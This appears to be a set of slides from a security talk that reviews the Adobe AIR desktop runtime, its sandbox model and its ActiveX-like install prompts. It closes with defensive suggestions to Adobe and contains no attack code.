What’s a RIA?
“Rich Internet Applications”
As with “Web 2.0”, ill-deﬁned
May contain some of the following ingredients:
AJAXy Flashiness
Local storage
“Oﬄine mode”
Decoupling from the browser
Access to lower level OS resources: sockets, hardware
devices
Appearance of a traditional desktop application
Our research has shown a huge disparity in features and
security design

Why use a RIA?
“Web 2.0” no longer gets you VC funding
Never learned any real programming languages
To increase responsiveness — distribute data stores
between server and client
Desktop integration — take advantage of OS UI
functionality
In short, web developers can now write full “desktop”
apps. This could be good or bad.

What is Adobe AIR?
Full-featured desktop runtime based upon Adobe Flash
technology
Cross-browser, cross-platform
Applications can be created with:
Adobe Flex 3
Adobe Flash CS3
HTML and JS using free tools
AIR intended to be more powerful than a browser-based
RIA
There is no sandbox around the application
AIR apps run with the full powers of the user

What is Adobe AIR?
So it’s just like a Win32 program in the eyes of a security
analyst?
Um, not really
Power of AIR is the “I” in “RIA”
Can be invoked by browser with arguments, like ActiveX or
Flash
Has many native mechanisms for loading external content
Highly likely that developers will utilize Internet content.
That’s the point.

What is Adobe AIR?
AIR is best thought of as an ActiveX analogue and not
like Flash++
Code runs with full privileges, can install malware
Native mechanisms allow for interaction with untrusted
world
Fortunately, Adobe has seemed to learn some lessons from
ActiveX

Adobe AIR Security Model
By default, code included in AIR application has full rights
New functionality in privileged APIs added to JavaScript
and ActionScript
Some restrictions on interacting with desktop in AIR 1.0
Existing capabilities can be chained to run native code
Rumors of additional native code capabilities in future

Adobe AIR Security Model
No “code access security” model as understood on other
systems, such as Java or .Net
Instead, ﬁve pre-deﬁned sandboxes with ﬁxed capabilities
Application — Full perms. Default for code included with
AIR app
Remote — Code downloaded from internet. Browser-like
permissions
Three intermediate permissions for local SWFs

Adobe AIR Security Model
AIR has many ways of loading executable content to run,
such as HTML/JS and SWFs
Also many ways of getting external untrusted data
Network traﬃc
Arguments from browser invocation
Command line arguments
Application Sandbox
Is not supposed to be able to dynamically generate code
eval() is best example in JS
Goal is to eliminate XSS and injection attacks that have
plagued Flash apps that have more kick with local
privileges

Adobe AIR Security Model
Default for remotely loaded code is Remote sandbox
Cannot access new dangerous classes, like FileStream()
Can access eval() and other dynamic methods
Can be granted cross-domain XHR
Should be suﬃcient for most of the content developers
would want from Internet, such as HTML or movie SWFs

Installing an AIR Application
Actually, looks more like pre-IE7 ActiveX
What am I complaining about? They give the correct
information
True, but so did ActiveX
Allowing users to install signed applets is dangerous enough
Allowing self-signed (which is same as unsigned) is
terrifying
The popularity of ActiveX and the ability of web sites to
pop open prompts made it the premier malware seeding
mechanism
Adobe Flash is more popular than IE ever was
It’s almost impossible to install ActiveX now. That’s not
an accident.

Our suggestions
Change default action
Add a countdown timer to discourage mindless
clickthrough
There is already a registry key to disable unsigned install
prompts, turn it on by default
Stop advertising self-signed AIR applications on
Adobe.com
There is perhaps room for something between AIR and
Flash without the rootkit abilities
